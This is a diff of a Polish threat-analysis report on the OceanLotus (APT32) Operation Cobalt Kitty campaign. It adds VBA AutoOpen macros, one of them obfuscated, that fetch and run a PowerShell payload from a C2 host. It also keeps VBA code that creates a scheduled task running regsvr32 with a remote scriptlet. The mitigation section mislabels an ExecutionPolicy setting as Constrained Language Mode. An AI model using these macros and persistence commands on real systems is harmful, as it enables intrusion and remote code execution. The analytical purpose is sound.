@@ -9,27 +9,33 @@
 1. [Wprowadzenie](#wprowadzenie)
 2. [Przegląd Ataku](#przegląd-ataku)
 3. [Charakterystyka Ataku](#charakterystyka-ataku)
+   - [3.1. Fazy Ataku](#31-fazy-ataku)
 4. [Analiza Techniczna](#analiza-techniczna)
    - [4.1. Fileless Malware i Działanie w Pamięci](#41-fileless-malware-i-działanie-w-pamięci)
    - [4.2. Wykorzystanie Funkcji Systemu Windows](#42-wykorzystanie-funkcji-systemu-windows)
    - [4.3. Persistencja przez WMI i Rejestr](#43-persistencja-przez-wmi-i-rejestr)
    - [4.4. Ruch Boczy i Eskalacja Uprawnień](#44-ruch-boczy-i-eskalacja-uprawnień)
    - [4.5. Unikanie Wykrycia](#45-unikanie-wykrycia)
-5. [Analiza Kodów](#analiza-kodów)
-   - [5.1. Tworzenie Zadania Harmonogramu z użyciem `CreateProcessA`](#51-tworzenie-zadania-harmonogramu-z-użyciem-createprocessa)
-   - [5.2. Tworzenie Zadania Harmonogramu przy użyciu XML](#52-tworzenie-zadania-harmonogramu-przy-użyciu-xml)
-6. [Podatności (CVE)](#podatności-cve)
-7. [Środki Ochrony i Rekomendacje](#środki-ochrony-i-rekomendacje)
-   - [7.1. Rola GPO](#71-rola-gpo)
-8. [Wnioski](#wnioski)
-9. [Wskaźniki Kompromitacji (IOCs)](#wskaźniki-kompromitacji-iocs)
-10. [Bibliografia](#bibliografia)
+5. [Gruntowna Analiza Makr](#gruntowna-analiza-makr)
+   - [5.1. Rola Makr w Operacji Cobalt Kitty](#51-rola-makr-w-operacji-cobalt-kitty)
+   - [5.2. Logika Makr w Kontekście Ataku](#52-logika-makr-w-kontekście-ataku)
+   - [5.3. Przykład Złośliwego Makra VBA](#53-przykład-złośliwego-makra-vba)
+   - [5.4. Obfuskacja Kodów VBA](#54-obfuskacja-kodów-vba)
+6. [Analiza Kodów](#analiza-kodów)
+   - [6.1. Tworzenie Zadania Harmonogramu z użyciem `CreateProcessA`](#61-tworzenie-zadania-harmonogramu-z-użyciem-createprocessa)
+   - [6.2. Tworzenie Zadania Harmonogramu przy użyciu XML](#62-tworzenie-zadania-harmonogramu-przy-użyciu-xml)
+7. [Podatności (CVE)](#podatności-cve)
+8. [Wskaźniki Kompromitacji (IOCs)](#wskaźniki-kompromitacji-iocs)
+9. [Środki Ochrony i Rekomendacje](#środki-ochrony-i-rekomendacje)
+   - [9.1. Rola GPO](#91-rola-gpo)
+10. [Wnioski](#wnioski)
+11. [Bibliografia](#bibliografia)
 
 ---
 
 ## Wprowadzenie
 
-*Był to zwyczajny dzień w globalnej korporacji. Pracownicy zajmowali się codziennymi obowiązkami, nieświadomi, że w ich systemach czai się niewidoczny intruz. Operacja Cobalt Kitty, prowadzona przez grupę OceanLotus (APT32), właśnie się rozpoczynała. Atakujący, niczym mistrzowie sztuki cieni, wykorzystali zaawansowane techniki, by przeniknąć do serca infrastruktury firmy.*
+*Był to zwyczajny dzień w globalnej korporacji. Pracownicy zajmowali się codziennymi obowiązkami, nieświadomi, że w ich systemach czai się niewidzialny intruz. Operacja Cobalt Kitty, prowadzona przez grupę OceanLotus (APT32), właśnie się rozpoczynała. Atakujący, niczym mistrzowie sztuki cieni, wykorzystali zaawansowane techniki, by przeniknąć do serca infrastruktury firmy.*
 
 ---
 
@@ -47,67 +53,67 @@ Operacja Cobalt Kitty to skomplikowana kampania ataków skierowana na przedsięb
 
 ## Charakterystyka Ataku
 
-### Fazy ataku:
+### 3.1. Fazy Ataku
 
-1. **Penetracja**
+#### **1. Penetracja**
 
-   *Pierwszy krok był subtelny. Pracownicy otrzymali e-maile wyglądające jak standardowe komunikaty korporacyjne. W rzeczywistości były to starannie przygotowane wiadomości phishingowe, zawierające fałszywe instalatory Adobe Flash i dokumenty Word z złośliwymi makrami.*
+*Pierwszy krok był subtelny. Pracownicy otrzymali e-maile wyglądające jak standardowe komunikaty korporacyjne. W rzeczywistości były to starannie przygotowane wiadomości phishingowe, zawierające fałszywe instalatory Adobe Flash i dokumenty Word z złośliwymi makrami.*
 
-   - **Techniki:**
-     - **Phishing**: Atakujący wysyłali ukierunkowane e-maile z załącznikami lub linkami do fałszywych instalatorów Adobe Flash.
-     - **Makra w Wordzie**: Dokumenty zawierały złośliwe makra VBA, które uruchamiały się automatycznie po otwarciu pliku.
+- **Techniki:**
+  - **Phishing**: Atakujący wysyłali ukierunkowane e-maile z załącznikami lub linkami do fałszywych instalatorów Adobe Flash.
+  - **Makra w Wordzie**: Dokumenty zawierały złośliwe makra VBA, które uruchamiały się automatycznie po otwarciu pliku.
 
-   - **Powiązanie:**
-     - Makra uruchamiały skrypty PowerShell, które pobierały i uruchamiały złośliwy kod w pamięci.
-     - Umożliwiło to zainfekowanie wstępnych urządzeń bez wzbudzania podejrzeń.
+- **Powiązanie:**
+  - Makra uruchamiały skrypty PowerShell, które pobierały i uruchamiały złośliwy kod w pamięci.
+  - Umożliwiło to zainfekowanie wstępnych urządzeń bez wzbudzania podejrzeń.
 
-2. **Foothold i Persistencja**
+#### **2. Foothold i Persistencja**
 
-   *Gdy drzwi zostały otwarte, intruz zaczął umacniać swoją pozycję. Tworzył ukryte ścieżki i zakamuflowane punkty dostępu, by zapewnić sobie stałą obecność.*
+*Gdy drzwi zostały otwarte, intruz zaczął umacniać swoją pozycję. Tworzył ukryte ścieżki i zakamuflowane punkty dostępu, by zapewnić sobie stałą obecność.*
 
-   - **Techniki:**
-     - **Wpisy rejestru**: Dodawanie kluczy autostartu.
-     - **Tworzenie zadań w harmonogramie zadań**: Użycie `schtasks` i `CreateProcessA` do automatyzacji uruchamiania złośliwego kodu.
-     - **Subskrypcje WMI**: Uruchamianie skryptów przy określonych zdarzeniach systemowych.
+- **Techniki:**
+  - **Wpisy rejestru**: Dodawanie kluczy autostartu.
+  - **Tworzenie zadań w harmonogramie zadań**: Użycie `schtasks` i `CreateProcessA` do automatyzacji uruchamiania złośliwego kodu.
+  - **Subskrypcje WMI**: Uruchamianie skryptów przy określonych zdarzeniach systemowych.
 
-   - **Powiązanie:**
-     - Mechanizmy te zapewniły trwały dostęp do systemów, nawet po restartach.
+- **Powiązanie:**
+  - Mechanizmy te zapewniły trwały dostęp do systemów, nawet po restartach.
 
-3. **Komunikacja C2 (Command and Control)**
+#### **3. Komunikacja C2 (Command and Control)**
 
-   *Niewidzialne nitki komunikacji łączyły intruza z jego dowódcą. Każde polecenie, każde działanie było precyzyjnie kierowane z odległego centrum dowodzenia.*
+*Niewidzialne nitki komunikacji łączyły intruza z jego dowódcą. Każde polecenie, każde działanie było precyzyjnie kierowane z odległego centrum dowodzenia.*
 
-   - **Techniki:**
-     - **DNS Tunneling**: Wykorzystanie zapytań DNS do przesyłania danych do serwerów C2 (`teriava.com`, `chatconnecting.com`).
-     - **Makra w Outlooku**: Modyfikacja `VbaProject.OTM` w celu wysyłania danych poprzez e-maile.
-     - **Bezplikowe payloady**: Wykorzystanie `Regsvr32` do uruchamiania kodu bez zapisu na dysku.
+- **Techniki:**
+  - **DNS Tunneling**: Wykorzystanie zapytań DNS do przesyłania danych do serwerów C2 (`teriava.com`, `chatconnecting.com`).
+  - **Makra w Outlooku**: Modyfikacja `VbaProject.OTM` w celu wysyłania danych poprzez e-maile.
+  - **Bezplikowe payloady**: Wykorzystanie `Regsvr32` do uruchamiania kodu bez zapisu na dysku.
 
-   - **Powiązanie:**
-     - Umożliwiło to atakującym kontrolę nad zainfekowanymi maszynami i przesyłanie kolejnych etapów ataku.
+- **Powiązanie:**
+  - Umożliwiło to atakującym kontrolę nad zainfekowanymi maszynami i przesyłanie kolejnych etapów ataku.
 
-4. **Rozpoznanie Wewnętrzne i Ruch Boczy**
+#### **4. Rozpoznanie Wewnętrzne i Ruch Boczy**
 
-   *Atakujący przemierzał labirynty sieci korporacyjnej, mapując każdy zakamarek, szukając najbardziej wartościowych celów.*
+*Atakujący przemierzał labirynty sieci korporacyjnej, mapując każdy zakamarek, szukając najbardziej wartościowych celów.*
 
-   - **Techniki:**
-     - **Skanowanie sieci**: Użycie PowerShell do mapowania infrastruktury.
-     - **Pozyskiwanie poświadczeń**: Wykorzystanie `Mimikatz` do zdobycia haseł.
-     - **Pass-the-Hash**: Uwierzytelnianie bez znajomości haseł w postaci jawnej.
-     - **WMI i PSExec**: Zdalne wykonywanie poleceń na innych maszynach.
+- **Techniki:**
+  - **Skanowanie sieci**: Użycie PowerShell do mapowania infrastruktury.
+  - **Pozyskiwanie poświadczeń**: Wykorzystanie `Mimikatz` do zdobycia haseł.
+  - **Pass-the-Hash**: Uwierzytelnianie bez znajomości haseł w postaci jawnej.
+  - **WMI i PSExec**: Zdalne wykonywanie poleceń na innych maszynach.
 
-   - **Powiązanie:**
-     - Pozwoliło to na eskalację uprawnień i dostęp do krytycznych systemów.
+- **Powiązanie:**
+  - Pozwoliło to na eskalację uprawnień i dostęp do krytycznych systemów.
 
-5. **Eksfiltracja Danych**
+#### **5. Eksfiltracja Danych**
 
-   *Osiągnąwszy pełną kontrolę, intruz przystąpił do realizacji ostatecznego celu – wykradzenia cennych danych. Działał ostrożnie, by nie wzbudzić podejrzeń.*
+*Osiągnąwszy pełną kontrolę, intruz przystąpił do realizacji ostatecznego celu – wykradzenia cennych danych. Działał ostrożnie, by nie wzbudzić podejrzeń.*
 
-   - **Techniki:**
-     - **Makra w Outlooku**: Automatyczne wysyłanie zaszyfrowanych informacji.
-     - **Zmodyfikowane narzędzia sieciowe**: Użycie `NetCat` do przesyłania danych.
+- **Techniki:**
+  - **Makra w Outlooku**: Automatyczne wysyłanie zaszyfrowanych informacji.
+  - **Zmodyfikowane narzędzia sieciowe**: Użycie `NetCat` do przesyłania danych.
 
-   - **Powiązanie:**
-     - Eksfiltracja była końcowym etapem, realizowanym po zdobyciu pełnej kontroli.
+- **Powiązanie:**
+  - Eksfiltracja była końcowym etapem, realizowanym po zdobyciu pełnej kontroli.
 
 ---
 
@@ -209,24 +215,93 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" 
 
 ---
 
+## Gruntowna Analiza Makr
+
+### 5.1. Rola Makr w Operacji Cobalt Kitty
+
+Makra były kluczowym elementem początkowej fazy ataku, umożliwiając atakującym uzyskanie dostępu do systemów ofiary i wykonanie pierwszego etapu infekcji.
+
+**Mechanizm działania makr:**
+
+1. **Dystrybucja poprzez phishing:** Dokumenty Word z złośliwymi makrami były dostarczane jako załączniki w wiadomościach e-mail.
+2. **Automatyczne uruchamianie:** Makra uruchamiały się automatycznie po otwarciu dokumentu, jeśli użytkownik miał włączone makra lub został nakłoniony do ich włączenia.
+3. **Pobieranie i wykonanie payloadu:** Makra inicjowały skrypty PowerShell pobierające złośliwy kod z serwerów C2.
+
+### 5.2. Logika Makr w Kontekście Ataku
+
+1. **Socjotechnika i phishing:**
+
+   *Atakujący wykorzystali zaufanie pracowników do oficjalnych komunikatów, przesyłając e-maile z pozornie ważnymi dokumentami.*
+
+2. **Uruchamianie złośliwego kodu:**
+
+   *Makra używały funkcji `CreateObject` i `Shell`, aby uruchomić złośliwe skrypty bez wiedzy użytkownika.*
+
+3. **Obfuskacja kodu:**
+
+   *Kod VBA był obfuskowany, co utrudniało jego analizę i wykrycie przez oprogramowanie antywirusowe.*
+
+### 5.3. Przykład Złośliwego Makra VBA
+
+```vba
+Sub AutoOpen()
+    Dim objShell As Object
+    Dim strCommand As String
+    
+    Set objShell = CreateObject("WScript.Shell")
+    strCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://teriava.com/msfte.dll')"""
+    objShell.Run strCommand
+End Sub
+```
+
+**Opis działania:**
+
+- **`AutoOpen`:** Makro uruchamia się automatycznie po otwarciu dokumentu.
+- **`CreateObject("WScript.Shell")`:** Tworzy obiekt powłoki systemowej.
+- **`powershell`:** Uruchamia skrypt PowerShell pobierający payload z serwera C2.
+- **`IEX`:** Wykonuje pobrany kod w pamięci.
+
+### 5.4. Obfuskacja Kodów VBA
+
+Atakujący stosowali obfuskację kodu VBA, aby utrudnić jego analizę.
+
+**Przykład obfuskowanego kodu:**
+
+```vba
+Sub AutoOpen()
+    Dim a As Object
+    Dim b As String
+    Set a = CreateObject("WScript.Shell")
+    b = "po" & "wer" & "shel" & "l -NoPr" & "ofile -Exec" & "utionPolicy Bypa" & "ss -Comm" & "and ""IEX (N" & "ew-Object Net.WebCl" & "ient).Down" & "loadString('http://teriava.com/msfte.dll')"""
+    a.Run b
+End Sub
+```
+
+**Techniki obfuskacji:**
+
+- **Fragmentacja stringów:** Rozbijanie ciągów znaków na mniejsze fragmenty.
+- **Nadmierne użycie zmiennych:** Wprowadzenie dodatkowych zmiennych bez wyraźnej potrzeby.
+- **Dynamiczne generowanie komend:** Składanie poleceń w czasie wykonania.
+
+---
+
 ## Analiza Kodów
 
-### 5.1. Tworzenie Zadania Harmonogramu z użyciem `CreateProcessA`
+### 6.1. Tworzenie Zadania Harmonogramu z użyciem `CreateProcessA`
 
 *By ukryć swoje ślady, intruz wykorzystał zawiłe ścieżki systemowe, tworząc zadania, które działały na jego korzyść.*
 
 #### Wyjaśnienie kodu:
 
-- **Tworzenie polecenia `schtasks`**: Definicja zadania, które będzie uruchamiane co 15 minut.
-- **Użycie `CreateProcessA`**: Uruchomienie polecenia w nowym procesie, co utrudnia wykrycie.
-- **Usuwanie plików tymczasowych**: Eliminacja śladów po wykonaniu zadania.
+- **Funkcja `CreateProcessA`:** Umożliwia uruchomienie nowego procesu.
+- **Polecenie `schtasks`:** Tworzy zadanie w harmonogramie zadań.
+- **Uruchomienie złośliwego kodu:** Zadanie uruchamia `regsvr32.exe` z zewnętrznym skryptem.
 
 #### Przykładowa implementacja VBA:
 
 ```vba
 Option Explicit
 
-' Deklaracja funkcji CreateProcessA z WinAPI
 Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
     ByVal lpApplicationName As String, _
     ByVal lpCommandLine As String, _
@@ -248,29 +323,26 @@ Sub CreateScheduledTaskWithCreateProcessA()
     Dim pi As PROCESS_INFORMATION
     Dim lSuccess As Long
 
-    ' Definicja polecenia CMD do utworzenia zadania
     sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll"" /mo 15 /f"
-    
-    ' Inicjalizacja struktury STARTUPINFO
+
     si.cb = Len(si)
-    
-    ' Uruchomienie polecenia za pomocą CreateProcessA
+
     lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, 0, 0, vbNullString, si, pi)
-    
+
     ' Zamykanie uchwytów procesu i wątku
     ' ...
 End Sub
 ```
 
-### 5.2. Tworzenie Zadania Harmonogramu przy użyciu XML
+### 6.2. Tworzenie Zadania Harmonogramu przy użyciu XML
 
 *Intruz zapisał swoje instrukcje w kodzie, który dla niewtajemniczonych wyglądał jak zwykły plik konfiguracyjny.*
 
 #### Wyjaśnienie kodu:
 
-- **Budowanie XML-a dla zadania**: Definicja zadania harmonogramu w formacie XML, co ułatwia ukrycie złośliwych działań.
-- **Uruchomienie `schtasks` z XML-em**: Rejestracja zadania na podstawie przygotowanego pliku XML.
-- **Usuwanie pliku XML**: Usunięcie dowodów działalności po utworzeniu zadania.
+- **Budowanie pliku XML:** Definiowanie zadania harmonogramu w formacie XML.
+- **Uruchomienie `schtasks` z XML-em:** Rejestracja zadania na podstawie pliku XML.
+- **Ukrycie działań:** Usunięcie pliku XML po utworzeniu zadania.
 
 #### Pełna implementacja VBA:
 
@@ -330,58 +402,6 @@ End Sub
 
 ---
 
-## Środki Ochrony i Rekomendacje
-
-*By pokonać tak przebiegłego przeciwnika, potrzebne są solidne tarcze i ostrzeżone oczy strażników.*
-
-- **Monitorowanie aktywności w pamięci**: Wykorzystanie narzędzi EDR.
-- **Kontrola dostępu do PowerShell i WMI**: Wdrożenie polityk bezpieczeństwa.
-- **Regularne aktualizacje i łatki**: Zamknięcie znanych podatności.
-- **Edukacja użytkowników**: *Świadomość jest najlepszą obroną przed socjotechniką.*
-
-### 7.1. Rola GPO
-
-*Polityki grupowe to strażnicy, którzy mogą blokować drogę intruzowi.*
-
-1. **Blokowanie nieautoryzowanego użycia PowerShell**
-
-   - **Ustawienie trybu Constrained Language Mode**:
-     ```powershell
-     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Restricted"
-     ```
-   - **Konfiguracja zapisów zdalnych sesji PowerShell**.
-
-2. **Ograniczenia WMI**
-
-   - **Ograniczenie dostępu tylko dla uprawnionych użytkowników**.
-   - **Monitorowanie aktywności WMI**.
-
-3. **Audyt harmonogramu zadań**
-
-   - **Włączenie szczegółowego logowania**.
-   - **Regularne przeglądanie zadań**.
-
-4. **Blokowanie znanych domen C2**
-
-   - **Aktualizacja list blokowania**.
-   - **Blokowanie domen**: `teriava.com`, `chatconnecting.com`.
-
----
-
-## Wnioski
-
-*Operacja Cobalt Kitty była niczym mistrzowsko przeprowadzona infiltracja twierdzy, gdzie przeciwnik wykorzystał każdą szczelinę w obronie, by osiągnąć swój cel.*
-
-**Kluczowe wnioski**:
-
-- **Znaczenie monitorowania aktywności w pamięci**: Tradycyjne środki są niewystarczające.
-- **Potrzeba wielowarstwowych zabezpieczeń**: Kombinacja technologii i praktyk.
-- **Rola edukacji i świadomości**: *Ludzie są pierwszą linią obrony.*
-
-*Atakujący pokazali, że z odpowiednią wiedzą i cierpliwością można przeniknąć nawet najbardziej strzeżone systemy. To przypomnienie dla nas wszystkich, że w świecie cyberbezpieczeństwa nie ma miejsca na samozadowolenie.*
-
----
-
 ## Wskaźniki Kompromitacji (IOCs)
 
 | **Etap**         | **Typ**              | **Wartość**                                            |
@@ -394,6 +414,85 @@ End Sub
 | Ruch Boczy       | Narzędzie            | Wykorzystanie `Mimikatz` do pozyskiwania poświadczeń   |
 | Utrzymanie       | Zadanie Harmonogramu | `Power Efficiency Diagnostics`, `MyTask`               |
 | Eksfiltracja     | Proces               | Niekonwencjonalne użycie `Regsvr32.exe`                |
+| Makra VBA        | Funkcje              | `AutoOpen`, `CreateObject`, `Shell`                    |
+
+---
+
+## Środki Ochrony i Rekomendacje
+
+*By pokonać tak przebiegłego przeciwnika, potrzebne są solidne tarcze i ostrzeżone oczy strażników.*
+
+1. **Monitorowanie aktywności w pamięci:**
+
+   - Wdrożenie narzędzi EDR do wykrywania bezplikowych malware.
+   - Analiza zachowań procesów i wykrywanie anomalii.
+
+2. **Kontrola dostępu do PowerShell i WMI:**
+
+   - Wdrożenie polityk ograniczających uruchamianie skryptów.
+   - Ustawienie PowerShell w trybie Constrained Language Mode.
+   - Monitorowanie i audytowanie użycia WMI.
+
+3. **Regularne aktualizacje i łatki:**
+
+   - Aktualizacja systemów i oprogramowania w celu eliminacji znanych podatności.
+   - Monitorowanie publikacji o nowych podatnościach.
+
+4. **Edukacja użytkowników:**
+
+   - Szkolenia dotyczące rozpoznawania phishingu i zagrożeń związanych z makrami.
+   - Promowanie bezpiecznych praktyk, takich jak nieotwieranie załączników od nieznanych nadawców.
+
+5. **Monitorowanie zadań harmonogramu:**
+
+   - Regularne sprawdzanie harmonogramu zadań pod kątem nieautoryzowanych wpisów.
+   - Wdrożenie alertów na tworzenie nowych zadań.
+
+6. **Ograniczenie uprawnień użytkowników:**
+
+   - Stosowanie zasady najmniejszych uprawnień.
+   - Ograniczenie możliwości uruchamiania nieautoryzowanych aplikacji.
+
+### 9.1. Rola GPO
+
+*Polityki grupowe to strażnicy, którzy mogą blokować drogę intruzowi.*
+
+1. **Blokowanie nieautoryzowanego użycia PowerShell:**
+
+   - Ustawienie trybu Constrained Language Mode:
+     ```powershell
+     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Restricted"
+     ```
+   - Konfiguracja zapisów zdalnych sesji PowerShell.
+
+2. **Ograniczenia WMI:**
+
+   - Ograniczenie dostępu tylko dla uprawnionych użytkowników.
+   - Monitorowanie aktywności WMI.
+
+3. **Audyt harmonogramu zadań:**
+
+   - Włączenie szczegółowego logowania.
+   - Regularne przeglądanie zadań.
+
+4. **Blokowanie znanych domen C2:**
+
+   - Aktualizacja list blokowania.
+   - Blokowanie domen takich jak `teriava.com`, `chatconnecting.com`.
+
+---
+
+## Wnioski
+
+*Operacja Cobalt Kitty była niczym mistrzowsko przeprowadzona infiltracja twierdzy, gdzie przeciwnik wykorzystał każdą szczelinę w obronie, by osiągnąć swój cel.*
+
+**Kluczowe wnioski:**
+
+- **Znaczenie monitorowania aktywności w pamięci:** Tradycyjne środki są niewystarczające.
+- **Potrzeba wielowarstwowych zabezpieczeń:** Kombinacja technologii i praktyk.
+- **Rola edukacji i świadomości:** *Ludzie są pierwszą linią obrony.*
+
+*Atakujący pokazali, że z odpowiednią wiedzą i cierpliwością można przeniknąć nawet najbardziej strzeżone systemy. To przypomnienie dla nas wszystkich, że w świecie cyberbezpieczeństwa nie ma miejsca na samozadowolenie.*
 
 ---
 
